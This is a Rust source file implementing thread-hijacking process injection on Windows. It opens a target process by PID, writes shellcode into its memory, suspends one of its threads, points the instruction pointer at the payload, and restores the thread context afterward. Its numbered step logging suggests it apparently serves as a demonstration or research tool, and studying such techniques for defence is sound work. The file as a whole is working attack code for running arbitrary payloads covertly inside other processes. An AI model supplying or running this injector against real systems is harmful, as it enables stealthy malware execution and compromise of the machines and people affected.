use crate::injection::InjectionResult;
use crate::log::LogSink;

#[cfg(windows)]
pub fn live_inject(
    pid: u32,
    shellcode: &[u8],
    log: &LogSink,
) -> Result<InjectionResult, String> {
    use super::common::{free_remote, write_remote_payload};
    use super::wrappers::wrap_for_hijack;
    use windows::Win32::Foundation::{CloseHandle, FALSE};
    use windows::Win32::System::Diagnostics::Debug::{
        GetThreadContext, ReadProcessMemory, SetThreadContext, CONTEXT, CONTEXT_FLAGS,
    };
    use windows::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Thread32First, Thread32Next, THREADENTRY32, TH32CS_SNAPTHREAD,
    };
    use windows::Win32::System::Threading::{
        OpenProcess, OpenThread, ResumeThread, SuspendThread, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, THREAD_GET_CONTEXT,
        THREAD_SET_CONTEXT, THREAD_SUSPEND_RESUME,
    };

    log.step(format!(
        "[1/7] OpenProcess(PID {}) — PROCESS_QUERY_INFORMATION | PROCESS_VM_*",
        pid
    ));
    let process_access =
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;
    let process = unsafe { OpenProcess(process_access, FALSE, pid) }.map_err(|e| {
        format!("OpenProcess failed: {e} (check privileges — try from an elevated shell)")
    })?;

    let wrapped = wrap_for_hijack(shellcode);
    let size = wrapped.len();
    let flag_offset = size - 1;
    let base = write_remote_payload(process, &wrapped, 7, log)?;

    log.step("[5/7] SuspendThread — finding and suspending a target thread");

    let snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) }.map_err(|e| {
        free_remote(process, base, log);
        format!("CreateToolhelp32Snapshot failed: {e}")
    })?;

    let mut entry = THREADENTRY32 {
        dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
        ..Default::default()
    };

    let mut target_tid: Option<u32> = None;
    if unsafe { Thread32First(snapshot, &mut entry) }.is_ok() {
        loop {
            if entry.th32OwnerProcessID == pid {
                target_tid = Some(entry.th32ThreadID);
                break;
            }
            if unsafe { Thread32Next(snapshot, &mut entry) }.is_err() {
                break;
            }
        }
    }
    let _ = unsafe { CloseHandle(snapshot) };

    let tid = match target_tid {
        Some(t) => t,
        None => {
            free_remote(process, base, log);
            let _ = unsafe { CloseHandle(process) };
            return Err(format!("no threads found for PID {}", pid));
        }
    };

    let thread_access = THREAD_SET_CONTEXT | THREAD_GET_CONTEXT | THREAD_SUSPEND_RESUME;
    let thread = unsafe { OpenThread(thread_access, FALSE, tid) }.map_err(|e| {
        free_remote(process, base, log);
        let _ = unsafe { CloseHandle(process) };
        format!("OpenThread(TID {}) failed: {e}", tid)
    })?;

    let suspend_result = unsafe { SuspendThread(thread) };
    if suspend_result == u32::MAX {
        let _ = unsafe { CloseHandle(thread) };
        free_remote(process, base, log);
        let _ = unsafe { CloseHandle(process) };
        return Err(format!("SuspendThread(TID {}) failed", tid));
    }
    log.info(format!("      suspended thread TID {}", tid));

    log.step("[6/7] SetThreadContext — redirecting RIP to shellcode");

    let mut context: CONTEXT = unsafe { core::mem::zeroed() };
    context.ContextFlags = CONTEXT_FLAGS(0x10001F);
    if let Err(e) = unsafe { GetThreadContext(thread, &mut context) } {
        let _ = unsafe { ResumeThread(thread) };
        let _ = unsafe { CloseHandle(thread) };
        free_remote(process, base, log);
        let _ = unsafe { CloseHandle(process) };
        return Err(format!("GetThreadContext failed: {e}"));
    }

    let original_rip = context.Rip;
    log.info(format!("      original RIP: 0x{:X}", original_rip));

    let saved_context: CONTEXT = unsafe { core::ptr::read(&context) };

    context.Rip = base as u64;
    if let Err(e) = unsafe { SetThreadContext(thread, &context) } {
        let _ = unsafe { ResumeThread(thread) };
        let _ = unsafe { CloseHandle(thread) };
        free_remote(process, base, log);
        let _ = unsafe { CloseHandle(process) };
        return Err(format!("SetThreadContext failed: {e}"));
    }
    log.info(format!("      RIP redirected to shellcode at {:#p}", base));

    let _ = unsafe { ResumeThread(thread) };
    log.info("      thread resumed — shellcode executing");

    log.step("[7/7] WaitForCompletion — polling flag + restoring original context");

    let flag_addr = unsafe { (base as *const u8).add(flag_offset) };
    let mut flag_value: u8 = 0;
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(5);
    let mut completed = false;

    loop {
        if unsafe {
            ReadProcessMemory(
                process,
                flag_addr as *const core::ffi::c_void,
                &mut flag_value as *mut u8 as *mut core::ffi::c_void,
                1,
                None,
            )
        }
        .is_err()
        {
            break;
        }
        if flag_value == 1 {
            completed = true;
            break;
        }
        if std::time::Instant::now() > deadline {
            log.warning("      timeout waiting for shellcode completion (5s)");
            break;
        }
        std::thread::sleep(std::time::Duration::from_millis(50));
    }

    let _ = unsafe { SuspendThread(thread) };
    if let Err(e) = unsafe { SetThreadContext(thread, &saved_context) } {
        log.warning(format!("      SetThreadContext (restore) failed: {e}"));
    } else {
        log.info(format!(
            "      original context restored (RIP: 0x{:X})",
            original_rip
        ));
    }
    let _ = unsafe { ResumeThread(thread) };
    let _ = unsafe { CloseHandle(thread) };
    let _ = unsafe { CloseHandle(process) };

    if completed {
        log.info("      shellcode completed, thread continues normally");
    } else {
        log.warning("      shellcode may not have completed — context restored anyway");
    }

    log.info(format!(
        "      shellcode at remote address {:#p} ({} bytes, wrapped {}+83)",
        base,
        size,
        size - 83
    ));
    Ok(InjectionResult {
        remote_base: base as u64,
        size,
    })
}

#[cfg(not(windows))]
pub fn live_inject(
    _pid: u32,
    _shellcode: &[u8],
    _log: &LogSink,
) -> Result<InjectionResult, String> {
    Err("live injection requires Windows — this build is running on a non-Windows host".to_string())
}
